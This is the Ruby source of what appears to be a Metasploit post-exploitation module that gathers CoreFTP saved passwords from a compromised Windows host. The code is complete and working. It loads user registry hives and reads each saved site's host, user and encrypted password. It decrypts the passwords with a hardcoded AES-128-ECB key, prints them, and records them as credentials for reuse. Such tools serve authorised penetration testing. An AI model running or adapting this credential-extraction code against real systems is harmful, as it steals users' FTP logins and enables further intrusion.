##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
      'Description'   => %q{
        This module extracts saved passwords from the CoreFTP FTP client. These
      passwords are stored in the registry. They are encrypted with AES-128-ECB.
      This module extracts and decrypts these passwords.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      print_status("Looking at Key #{hive['HKU']}")
      begin
        subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
        if subkeys.nil? or subkeys.empty?
          print_status("CoreFTP not installed for this user.")
          next
        end

        subkeys.each do |site|
          site_key = "#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}"
          host = registry_getvaldata(site_key, "Host") || ""
          user = registry_getvaldata(site_key, "User") || ""
          port = registry_getvaldata(site_key, "Port") || ""
          epass = registry_getvaldata(site_key, "PW")
          next if epass == nil or epass == ""
          pass = decrypt(epass)
          pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
          print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")

          service_data = {
            address: host,
            port: port,
            service_name: 'ftp',
            protocol: 'tcp',
            workspace_id: myworkspace_id
          }

          credential_data = {
              origin_type: :session,
              session_id: session_db_id,
              post_reference_name: self.refname,
              private_type: :password,
              private_data: pass,
              username: user
          }

          credential_data.merge!(service_data)

          # Create the Metasploit::Credential::Core object
          credential_core = create_credential(credential_data)

          # Assemble the options hash for creating the Metasploit::Credential::Login object
          login_data ={
              core: credential_core,
              status: Metasploit::Model::Login::Status::UNTRIED
          }

          # Merge in the service data and create our Login
          login_data.merge!(service_data)
          login = create_credential_login(login_data)
        end
      rescue
        print_error("Cannot Access User SID: #{hive['HKU']}")
      end
    end
    unload_our_hives(userhives)
  end

  def decrypt(encoded)
    cipher = [encoded].pack("H*")
    aes = OpenSSL::Cipher.new("AES-128-ECB")
    aes.padding = 0
    aes.decrypt
    aes.key = "hdfzpysvpzimorhk"
    password = (aes.update(cipher) + aes.final).gsub(/\x00/,'')
    return password
  end
end
